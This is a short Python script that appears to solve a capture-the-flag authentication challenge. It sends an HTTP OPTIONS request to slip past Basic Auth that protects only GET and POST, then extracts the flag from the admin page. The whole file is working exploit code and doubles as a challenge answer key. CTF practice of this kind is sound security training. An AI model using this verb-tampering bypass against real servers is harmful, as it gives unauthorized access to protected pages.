#!/usr/bin/env python3

"""
Exploit for X-054-24 (Auth 007)

Bypasses BasicAuth limited to GET/POST by sending an OPTIONS request
to retrieve the admin page that echoes the flag.
Prints only the flag on success.
"""

import re
import sys
from urllib import request


def fetch_flag(url: str) -> str:
    req = request.Request(url, method="OPTIONS", headers={"User-Agent": "Mozilla/5.0"})
    with request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="ignore")
    m = re.search(r"FLAG\{[^}]*\}", body)
    if not m:
        raise RuntimeError("Flag not found in response")
    return m.group(0)


def main() -> int:
    url = "http://ip32817/index.php"
    try:
        flag = fetch_flag(url)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())

